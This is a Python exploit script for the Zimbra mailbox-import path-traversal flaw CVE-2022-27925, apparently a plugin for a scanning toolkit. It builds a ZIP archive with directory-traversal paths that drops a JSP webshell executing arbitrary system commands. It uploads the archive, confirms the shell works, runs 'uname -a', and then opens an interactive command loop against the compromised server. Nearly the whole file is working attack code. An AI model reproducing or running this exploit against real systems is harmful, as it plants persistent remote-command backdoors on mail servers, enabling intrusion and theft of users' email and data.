#! /usr/bin/python3
# -*- encoding: utf-8 -*-

import zipfile
import io
import random
import string
import requests
from urllib3.exceptions import InsecureRequestWarning
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


webshell_payload = r'<%@ page import="java.util.*,java.io.*"%><%%><HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUTTYPE="submit" VALUE="Send"></FORM><pre><%if (request.getParameter("cmd") != null) {    out.println("Command: " + request.getParameter("cmd") + "<div>");    Process p;    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));    }    else{        p = Runtime.getRuntime().exec(request.getParameter("cmd"));    }    OutputStream os = p.getOutputStream();    InputStream in = p.getInputStream();    DataInputStream dis = new DataInputStream(in);    String disr = dis.readLine();    while ( disr != null ) {    out.println(disr);    disr = dis.readLine();    }}%><div></pre></BODY></HTML>'
char_set = string.ascii_uppercase + string.digits
webshell_name = ''.join(random.sample(char_set*6, 6)) + '.jsp'
#vuln_paths = ["service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd", "service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1"]

ITERATE = False

class Cve_2022_27925:
    def __init__(self):
        self.url = None
    # FIX URL
    def fix_url(self,url):
        if not url.startswith('https://'):
            url = 'https://' + url
            url = url.rstrip("/")
        return url

    def build_zip(self,jsp, path):
        zip_buffer = io.BytesIO()
        zf = zipfile.ZipFile(zip_buffer, 'w')
        zf.writestr(path, jsp)
        zf.close()
        return zip_buffer.getvalue()

    def exploit(self,host, payload, cmd):
        headers = {
            'User-Agent': self.header["User-Agent"],
            'content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            r = requests.post(
                host + '', data=payload, headers=headers, verify=self.ssl, timeout=20,proxies=self.proxy)
            r = requests.post(
                host + '/service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1', data=payload, headers=headers, verify=self.ssl, timeout=20,proxies=self.proxy)
            OutPrintInfo("Zimbra",'Testing webshell')
            r = requests.get(host + '/zimbraAdmin/' + webshell_name +
                             '?cmd=' + cmd, verify=self.ssl, timeout=20,proxies=self.proxy,headers=self.header)
            if "Josexv1" in r.text:
                OutPrintInfo("Zimbra",'Webshell works!!')
                OutPrintInfo("Zimbra",f'WebShell location: {host + "/zimbraAdmin/" + webshell_name + ""}' )
                r = requests.get(host + '/zimbraAdmin/' + webshell_name +
                             '?cmd=uname+-a' , verify=self.ssl, timeout=20,proxies=self.proxy,headers=self.header)
                OutPrintInfo("Zimbra",f'Uname -a output: {r.text.split("<div>")[1].split("<div>")[0].strip()}')
                return True
            else:
                OutPrintInfo("Zimbra",'Target not vulnerable')
                return False
        except:
            OutPrintInfo("Zimbra",'Connection error')

    def ping_url(self,url):
        try:
            r = requests.get(url, verify=False, timeout=10)
            if r.status_code == 200:
                OutPrintInfo("Zimbra",'Target is up!')
                return True
            else:
                OutPrintInfo("Zimbra",'Target is down! Next >> \n')
                return False
        except:
            return False

    def poc_main(self,url):
        paths = [
            '../../../../mailboxd/webapps/zimbraAdmin/',
            '../../../../jetty_base/webapps/zimbraAdmin/',
            '../../../../jetty/webapps/zimbraAdmin/']
        work = 0
        try:
            for num in range(0, 3):
                OutPrintInfo("Zimbra",
                    'Creating malicious ZIP path: ' + paths[num])
                zippedfile = self.build_zip(webshell_payload, paths[num]+webshell_name)
                OutPrintInfo("Zimbra",'Exploiting!')
                if self.exploit(url, zippedfile, 'echo "Josexv1"'):
                    if self.url:
                        answer = Prompt.ask('[yellow]Want to interact with webshell via terminal? ([b red]y/n[/b red])')
                        if answer == "y":
                            OutPrintInfo("Zimbra",'Sending commands to: ' +
                                url + '/zimbraAdmin/' + webshell_name)
                            while True:
                                cmd = Prompt.ask("[yellow]>>>")

                                if cmd == "exit":
                                    break
                                req = requests.get(
                                    url + "/zimbraAdmin/" + webshell_name + "?cmd=" + cmd, verify=self.ssl, timeout=20,proxies=self.proxy,headers=self.header)
                                try:
                                    OutPrintInfo("Zimbra",req.text.split('<div>')[1].split('</div>')[0].strip())
                                except:
                                    OutPrintInfo("Zimbra","Error ?")
                        else:
                            OutPrintInfo("Zimbra",'Bye!')
                            exit()
        except:
            OutPrintInfo("Zimbra",'URL Error')
            ITERATE = True

    def main(self,target):
        self.url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.header, self.proxy = ReqSet(header=header, proxy=proxy)
        OutPrintInfo("Zimbra",f'Testing URL: {self.url}')
        if self.ping_url(self.url):
            self.poc_main(self.url)
